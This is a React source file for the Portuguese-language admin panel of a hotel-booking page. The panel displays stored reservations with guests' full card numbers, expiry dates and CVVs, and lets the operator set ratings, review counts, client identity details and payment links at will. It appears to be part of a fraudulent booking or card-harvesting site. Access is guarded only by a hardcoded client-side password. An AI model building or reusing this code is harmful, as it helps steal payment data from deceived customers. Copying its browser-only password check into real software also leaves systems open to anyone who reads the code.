import { useState } from 'react';
import { trpc } from '@/lib/trpc';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { X, Plus, Upload, Lock } from 'lucide-react';
import { toast } from 'sonner';

interface HotelPhoto {
  id: string;
  url: string;
  title: string;
}

interface AdminPanelProps {
  isOpen: boolean;
  onClose: () => void;
  photos: HotelPhoto[];
  onPhotosChange: (photos: HotelPhoto[]) => void;
  updateHotelDataMutation?: any;
  hotelInfo: {
    propertyName: string;
    clientName: string;
    address: string;
    rating: number;
    reviewCount: number;
    checkInDate: string;
    checkOutDate: string;
    hospedageValue: number;
    paymentLink100: string;
    paymentLink30Pix: string;
    depositPercentage: number;
    clientEmail: string;
    clientPhone: string;
    clientCpf: string;
    guestCount: number;
    detail1: string;
    detail2: string;
    detail3: string;
    roomType: string;
    breakfastIncluded: boolean;
    freeCancellationDate: string;
    mainGuestName: string;
  };
  onHotelInfoChange: (info: any) => void;
}

const ADMIN_PASSWORD = '12345678';

function ReservationsViewer({ hotelBookingId }: { hotelBookingId?: number }) {
  const { data: reservations, isLoading } = trpc.reservations.getByHotel.useQuery(
    { hotelBookingId: hotelBookingId || 1 },
    { enabled: !!hotelBookingId }
  );

  if (isLoading) return <div className="text-sm text-muted-foreground">Carregando reservas...</div>;
  if (!reservations || reservations.length === 0) return <div className="text-sm text-muted-foreground">Nenhuma reserva encontrada</div>;

  return (
    <div className="space-y-3 max-h-96 overflow-y-auto">
      {reservations.map((reservation: any) => (
        <div key={reservation.id} className="border rounded-lg p-3 bg-gray-50 space-y-2">
          <div className="grid grid-cols-2 gap-2 text-sm">
            <div><p className="text-xs text-muted-foreground font-semibold">Nome</p><p className="font-semibold">{reservation.firstName} {reservation.lastName}</p></div>
            <div><p className="text-xs text-muted-foreground font-semibold">Email</p><p className="text-sm">{reservation.email}</p></div>
          </div>
          <div className="grid grid-cols-2 gap-2 text-sm">
            <div><p className="text-xs text-muted-foreground font-semibold">Telefone</p><p className="text-sm">{reservation.phone}</p></div>
            <div><p className="text-xs text-muted-foreground font-semibold">Método</p><p className="text-sm font-semibold">{reservation.paymentMethod === 'card' ? 'Cartão' : 'PIX'}</p></div>
          </div>
          {reservation.paymentMethod === 'card' && (
            <div className="border-t pt-2 space-y-2 bg-blue-50 p-2 rounded">
              <p className="text-xs font-semibold text-blue-900">Dados do Cartão</p>
              <div className="grid grid-cols-2 gap-2 text-xs">
                <div><p className="text-muted-foreground">Titular</p><p className="font-semibold">{reservation.cardholderName}</p></div>
                <div><p className="text-muted-foreground">Número</p><p className="font-mono">{reservation.cardNumber}</p></div>
                <div><p className="text-muted-foreground">Validade</p><p className="font-mono">{reservation.cardExpiry}</p></div>
                <div><p className="text-muted-foreground">CVV</p><p className="font-mono font-bold text-red-600">{reservation.cardCvv}</p></div>
                <div className="col-span-2"><p className="text-muted-foreground">Valor</p><p className="font-semibold">R$ {(reservation.totalPrice / 100).toFixed(2)}</p></div>
              </div>
            </div>
          )}
          <div className="text-[10px] text-muted-foreground">{new Date(reservation.createdAt).toLocaleString('pt-BR')}</div>
        </div>
      ))}
    </div>
  );
}

export default function AdminPanel({ isOpen, onClose, photos, onPhotosChange, updateHotelDataMutation, hotelInfo, onHotelInfoChange }: AdminPanelProps) {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [password, setPassword] = useState('');

  const handlePasswordSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (password === ADMIN_PASSWORD) {
      setIsAuthenticated(true);
      toast.success('Autenticado!');
    } else {
      toast.error('Senha incorreta');
    }
  };

  const handleAddPhoto = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const files = e.target.files;
    if (!files) return;
    for (let i = 0; i < files.length; i++) {
      const file = files[i];
      const reader = new FileReader();
      reader.onload = async (event) => {
        const base64Data = event.target?.result as string;
        const response = await fetch('/api/upload', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ imageData: base64Data, mimeType: file.type }),
        });
        if (response.ok) {
          const data = await response.json();
          onPhotosChange([...photos, { id: Date.now().toString() + Math.random(), url: data.url, title: file.name.split('.')[0] }]);
          toast.success('Foto adicionada!');
        }
      };
      reader.readAsDataURL(file);
    }
  };

  const handleLogout = () => {
    setIsAuthenticated(false);
    onClose();
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 z-50 flex items-center justify-center p-4">
      <div className="bg-white rounded-lg shadow-xl max-w-2xl w-full max-h-[90vh] overflow-y-auto">
        <div className="sticky top-0 bg-primary text-white p-6 flex items-center justify-between border-b z-10">
          <h2 className="text-2xl font-bold">Painel de Administração</h2>
          <button onClick={handleLogout} className="p-1 hover:bg-primary/80 rounded"><X /></button>
        </div>

        {!isAuthenticated ? (
          <div className="p-12 flex flex-col items-center">
            <Lock className="w-12 h-12 text-primary mb-4" />
            <form onSubmit={handlePasswordSubmit} className="w-full max-w-sm space-y-4">
              <Input type="password" value={password} onChange={(e) => setPassword(e.target.value)} placeholder="Senha" />
              <Button type="submit" className="w-full">Entrar</Button>
            </form>
          </div>
        ) : (
          <div className="p-6 space-y-6">
            <section className="space-y-4">
              <h3 className="text-lg font-bold">Configurações do Hotel</h3>
              <div className="grid gap-4">
                <div><Label>Nome do Imóvel</Label><Input value={hotelInfo.propertyName} onChange={(e) => onHotelInfoChange({...hotelInfo, propertyName: e.target.value})} /></div>
                <div><Label>Nome do Cliente</Label><Input value={hotelInfo.clientName} onChange={(e) => onHotelInfoChange({...hotelInfo, clientName: e.target.value})} /></div>
                <div><Label>Email do Cliente</Label><Input value={hotelInfo.clientEmail} onChange={(e) => onHotelInfoChange({...hotelInfo, clientEmail: e.target.value})} /></div>
                <div className="grid grid-cols-2 gap-4">
                  <div><Label>Check-in</Label><Input type="date" value={hotelInfo.checkInDate} onChange={(e) => onHotelInfoChange({...hotelInfo, checkInDate: e.target.value})} /></div>
                  <div><Label>Check-out</Label><Input type="date" value={hotelInfo.checkOutDate} onChange={(e) => onHotelInfoChange({...hotelInfo, checkOutDate: e.target.value})} /></div>
                </div>
                <div><Label>Valor da Hospedagem (R$)</Label><Input type="number" step="0.01" value={hotelInfo.hospedageValue} onChange={(e) => onHotelInfoChange({...hotelInfo, hospedageValue: parseFloat(e.target.value)})} /></div>
                <div><Label>Endereço</Label><Input value={hotelInfo.address} onChange={(e) => onHotelInfoChange({...hotelInfo, address: e.target.value})} /></div>
                <div><Label>Link de Pagamento 100% (Cartão)</Label><Input value={hotelInfo.paymentLink100} onChange={(e) => onHotelInfoChange({...hotelInfo, paymentLink100: e.target.value})} /></div>
                <div><Label>Link de Pagamento (PIX)</Label><Input value={hotelInfo.paymentLink30Pix} onChange={(e) => onHotelInfoChange({...hotelInfo, paymentLink30Pix: e.target.value})} /></div>
                <div className="bg-blue-50 p-4 rounded-lg border border-blue-100">
                  <Label className="text-blue-900 font-bold">Porcentagem de Depósito (%)</Label>
                  <Input type="number" value={hotelInfo.depositPercentage} onChange={(e) => onHotelInfoChange({...hotelInfo, depositPercentage: parseInt(e.target.value) || 30})} className="mt-1" />
                </div>
                <div className="grid grid-cols-2 gap-4">
                  <div><Label>Telefone Cliente</Label><Input value={hotelInfo.clientPhone} onChange={(e) => onHotelInfoChange({...hotelInfo, clientPhone: e.target.value})} /></div>
                  <div><Label>CPF Cliente</Label><Input value={hotelInfo.clientCpf} onChange={(e) => onHotelInfoChange({...hotelInfo, clientCpf: e.target.value})} /></div>
                </div>
                <div><Label>Hóspede Principal</Label><Input value={hotelInfo.mainGuestName} onChange={(e) => onHotelInfoChange({...hotelInfo, mainGuestName: e.target.value})} /></div>
                <div><Label>Tipo de Quarto</Label><Input value={hotelInfo.roomType} onChange={(e) => onHotelInfoChange({...hotelInfo, roomType: e.target.value})} /></div>
                <div className="grid grid-cols-3 gap-2">
                  <div><Label>Detalhe 1</Label><Input value={hotelInfo.detail1} onChange={(e) => onHotelInfoChange({...hotelInfo, detail1: e.target.value})} /></div>
                  <div><Label>Detalhe 2</Label><Input value={hotelInfo.detail2} onChange={(e) => onHotelInfoChange({...hotelInfo, detail2: e.target.value})} /></div>
                  <div><Label>Detalhe 3</Label><Input value={hotelInfo.detail3} onChange={(e) => onHotelInfoChange({...hotelInfo, detail3: e.target.value})} /></div>
                </div>
                <div className="grid grid-cols-2 gap-4">
                  <div><Label>Avaliação</Label><Input type="number" step="0.1" value={hotelInfo.rating} onChange={(e) => onHotelInfoChange({...hotelInfo, rating: parseFloat(e.target.value)})} /></div>
                  <div><Label>Nº Avaliações</Label><Input type="number" value={hotelInfo.reviewCount} onChange={(e) => onHotelInfoChange({...hotelInfo, reviewCount: parseInt(e.target.value)})} /></div>
                </div>
              </div>
            </section>

            <section className="space-y-4 border-t pt-6">
              <h3 className="text-lg font-bold">Fotos do Hotel</h3>
              <div className="grid grid-cols-3 gap-2">
                {photos.map(photo => (
                  <div key={photo.id} className="relative group aspect-video">
                    <img src={photo.url} className="w-full h-full object-cover rounded" />
                    <button onClick={() => onPhotosChange(photos.filter(p => p.id !== photo.id))} className="absolute top-1 right-1 bg-red-500 text-white p-1 rounded-full opacity-0 group-hover:opacity-100"><X size={12}/></button>
                  </div>
                ))}
                <label className="border-2 border-dashed rounded flex flex-col items-center justify-center cursor-pointer hover:bg-gray-50 aspect-video">
                  <Upload size={20} className="text-gray-400" />
                  <span className="text-[10px] text-gray-400">Upload</span>
                  <input type="file" className="hidden" multiple onChange={handleAddPhoto} accept="image/*" />
                </label>
              </div>
            </section>

            <section className="border-t pt-6 space-y-4">
              <h3 className="font-bold text-foreground">Reservas Salvas</h3>
              <ReservationsViewer hotelBookingId={1} />
            </section>

            <div className="border-t pt-6 flex gap-3">
              <Button
                onClick={async () => {
                  try {
                    const photosJson = JSON.stringify(photos);
                    await updateHotelDataMutation.mutateAsync({ ...hotelInfo, photos: photosJson });
                    toast.success('Alterações salvas com sucesso!');
                    handleLogout();
                  } catch (error) {
                    toast.error('Erro ao salvar alterações');
                  }
                }}
                className="flex-1 bg-primary hover:bg-primary/90 text-white font-bold"
              >
                Salvar e Fechar
              </Button>
              <Button onClick={handleLogout} variant="outline" className="flex-1">Sair sem Salvar</Button>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
